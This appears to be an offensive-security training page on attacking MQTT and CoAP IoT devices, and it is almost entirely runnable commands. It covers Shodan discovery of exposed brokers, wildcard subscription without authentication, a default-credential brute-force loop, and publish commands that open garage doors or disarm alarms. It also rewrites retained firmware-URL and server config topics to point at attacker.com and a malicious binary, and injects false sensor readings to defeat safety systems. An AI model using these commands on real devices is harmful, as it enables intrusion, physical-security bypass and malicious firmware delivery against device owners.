---
layout: training-page
title: "MQTT / CoAP Attacks — Red Team Academy"
module: "IoT Hacking"
tags:
  - mqtt
  - coap
  - iot-protocols
  - broker
  - unauthenticated
page_key: "iot-mqtt-coap"
render_with_liquid: false
---

# MQTT / CoAP Protocol Attacks

MQTT is the dominant IoT messaging protocol — lightweight pub/sub over TCP (port 1883 unencrypted, 8883 TLS). CoAP is UDP-based REST for constrained devices. Both protocols are frequently deployed without authentication, allowing attackers to read sensor data, issue commands, and intercept credentials.

## MQTT Broker Discovery

```
# Shodan queries for exposed MQTT brokers:
port:1883 product:mosquitto
port:1883 MQTT
mqtt port:1883

# Nmap service detection:
nmap -sV -p 1883,8883 TARGET
nmap -p 1883 --script mqtt-subscribe TARGET

# Test connection (no auth):
mosquitto_sub -h TARGET -p 1883 -t "#" -v
# '#' = wildcard — subscribe to ALL topics
# -v = verbose (print topic names)

# Test with timeout:
mosquitto_sub -h TARGET -t "#" -v -C 100   # capture 100 messages then exit

# Check if auth required:
mosquitto_pub -h TARGET -t test -m "hello"
# If no error → no authentication configured
```

## Topic Enumeration & Subscription

```
# Subscribe to all topics (wildcard #):
mosquitto_sub -h TARGET -t "#" -v -u "" -P ""

# Subscribe with credentials:
mosquitto_sub -h TARGET -t "#" -v -u admin -P admin

# Common topic patterns to enumerate:
mosquitto_sub -h TARGET -t "home/#" -v       # home automation
mosquitto_sub -h TARGET -t "device/#" -v     # device telemetry
mosquitto_sub -h TARGET -t "sensor/#" -v     # sensor data
mosquitto_sub -h TARGET -t "command/#" -v    # commands
mosquitto_sub -h TARGET -t "+/status" -v     # device status
mosquitto_sub -h TARGET -t "factory/+" -v    # industrial

# MQTT Explorer — GUI tool for MQTT exploration
# https://mqtt-explorer.com/

# Publish to command topics:
mosquitto_pub -h TARGET -t "home/garage/door" -m "OPEN"
mosquitto_pub -h TARGET -t "device/relay/1" -m "1"
mosquitto_pub -h TARGET -t "command/alarm" -m "DISARM"

# Retained messages (persisted by broker):
mosquitto_sub -h TARGET -t "#" -v --retained-only
mosquitto_sub -h TARGET -t "config/#" -v    # often contains credentials in config topics
```

## MQTT Credential Brute Force

```
# MQTT brokers use username:password auth
# Common defaults: admin:admin, user:user, mosquitto:mosquitto

# Manual test with common credentials:
for cred in "admin:admin" "admin:password" "test:test" "user:user" "guest:guest"; do
  user=$(echo $cred | cut -d: -f1)
  pass=$(echo $cred | cut -d: -f2)
  result=$(mosquitto_sub -h TARGET -t "test" -u "$user" -P "$pass" -C 1 --quiet 2>&1)
  echo "$cred: $result"
done

# MQTTfuzz for fuzzing:
# https://github.com/F-Secure/mqtt_fuzz
python3 mqtt_fuzz.py -h TARGET -p 1883

# Brute force with hydra (custom MQTT module):
# No native hydra MQTT support — use custom scripts

# Check broker $SYS topics (broker statistics):
mosquitto_sub -h TARGET -t '$SYS/#' -v
# Often contains: connected clients, messages/sec, broker version
# Example: $SYS/broker/clients/connected → number of clients
```

## MQTT Retained Message Abuse

```
# Retained messages persist on broker until replaced
# Replace retained messages with malicious content:

# Check existing retained:
mosquitto_sub -h TARGET -t "config/device/firmware_url" -v --retained-only

# Replace firmware update URL:
mosquitto_pub -h TARGET -t "config/device/firmware_url" \
  -m "http://attacker.com/malicious.bin" -r

# Replace configuration:
mosquitto_pub -h TARGET -t "config/device" \
  -m '{"server":"attacker.com","port":443}' -r

# Inject false sensor readings:
mosquitto_pub -h TARGET -t "sensor/temperature" -m "99" -r
# Could trigger false alarms or disable safety systems
```

## CoAP Protocol Attacks

```
# CoAP = Constrained Application Protocol
# UDP port 5683 (CoAP) / 5684 (CoAPS/DTLS)
# GET, POST, PUT, DELETE methods (like HTTP)

# Install coap-cli:
npm install -g coap-cli

# Discover resources (CoAP resource discovery):
coap get coap://TARGET/.well-known/core
# Returns list of resources: ;rt="temperature"

# Read sensor:
coap get coap://TARGET/sensors/temperature
coap get coap://TARGET/actuators/led

# Set value (unauthenticated):
coap put coap://TARGET/actuators/led -p "1"      # turn on LED
coap put coap://TARGET/actuators/relay -p "on"   # activate relay

# CoAP observe (subscribe to updates):
coap observe coap://TARGET/sensors/temperature

# Nmap CoAP scanning:
nmap -sU -p 5683 --script coap-resources TARGET

# coap-client (libcoap):
apt install libcoap3-bin
coap-client -m get coap://TARGET/.well-known/core
coap-client -m put coap://TARGET/config -e '{"reboot":true}'
```

## MQTT over WebSocket

```
# MQTT can run over WebSocket (port 9001 common):
# Many IoT dashboards expose MQTT-WS without auth

# Connect via mqtt.js:
npm install -g mqtt
mqtt subscribe -h TARGET -p 9001 -l ws -t "#" -v

# Python paho-mqtt over WebSocket:
import paho.mqtt.client as mqtt
client = mqtt.Client(transport="websockets")
client.connect("TARGET", 9001, 60)
client.subscribe("#")
client.loop_forever()
```

## Tools & Resources

- Mosquitto — `mosquitto.org` — MQTT broker + client tools
- MQTT Explorer — GUI browser for MQTT topics
- MQTTfuzz — `github.com/F-Secure/mqtt_fuzz`
- OWASP IoT Attack Surface Areas — `owasp.org/www-project-internet-of-things/`
- coap-cli — `npmjs.com/package/coap-cli`
- Shodan for IoT protocols — port:1883, port:5683
